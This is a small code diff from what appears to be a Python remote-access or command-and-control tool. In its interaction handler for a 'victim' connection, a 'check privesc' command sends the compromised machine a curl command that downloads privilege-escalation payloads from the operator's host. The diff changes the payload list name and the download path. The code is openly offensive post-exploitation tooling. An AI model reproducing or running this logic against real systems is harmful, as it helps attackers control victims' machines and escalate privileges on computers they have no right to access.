@@ -217,10 +217,10 @@ def cmd_interact(conn, victim, socket_target):
                     if tmp_var[0] == "check":
                         if tmp_var[1] == "privesc":
                             selected_payload = int(tmp_var[2])
-                            if 0 < selected_payload <= len(banners.linux_payloads):
-                                payload = banners.linux_payloads[selected_payload-1][1]
+                            if 0 < selected_payload <= len(banners.privesc):
+                                payload = banners.privesc[selected_payload-1][1]
                                 if 1 <= int(selected_payload) <= 5:
-                                    cmd = f"curl {sys.argv[1]}:{sys.argv[3]}/{payload} -O {payload}"
+                                    cmd = f"curl {sys.argv[1]}:{sys.argv[3]}/payloads/{payload} -O {payload}"
                                     conn.sendall(cmd.encode('utf-8') + b'\n')
                                     output = conn.recv(8912).decode('utf-8')
                                     print(output)
